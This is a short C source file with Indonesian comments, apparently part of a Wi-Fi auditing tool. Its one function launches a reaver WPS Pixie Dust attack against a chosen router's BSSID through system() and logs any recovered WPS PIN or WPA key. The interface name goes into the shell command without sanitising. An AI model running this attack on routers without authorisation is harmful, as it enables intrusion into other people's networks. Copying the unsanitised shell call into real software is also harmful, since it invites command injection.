// ============================================================================
// IMPLEMENTASI: attack/wps_attack.c — Eksekusi Reaver WPS Audit
// ============================================================================
#include "wps_attack.h"
#include "../utils/utils.h"
#include "../utils/logger.h"
#include <stdio.h>
#include <stdlib.h>

/*
 * === FUNGSI: wps_attack_start() ===
 * Tujuan   : Menjalankan audit WPS PIN pada router sasaran
 * Catatan  : Mematuhi Fix #9 (Validasi status eksekusi perintah shell)
 */
int wps_attack_start(const char *iface, const uint8_t *bssid, int channel) {
    char bssid_str[18];
    format_mac(bssid, bssid_str);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "reaver -i %s -b %s -c %d -vv -K 1 -N",
             iface, bssid_str, channel);

    log_event(LOG_INFO, "Memulai WPS Pixie Dust Attack pada %s (Ch %d)", bssid_str, channel);
    
    // FIX #9: Hanya log sukses jika system() mengembalikan nilai 0
    int ret = system(cmd);
    if (ret == 0) {
        log_event(LOG_ALERT, "✅ WPS Attack Berhasil! PIN/WPA-Key ditemukan pada %s", bssid_str);
        return 0;
    } else {
        log_event(LOG_WARN, "WPS Attack selesai tanpa hasil atau dibatalkan");
        return -1;
    }
}
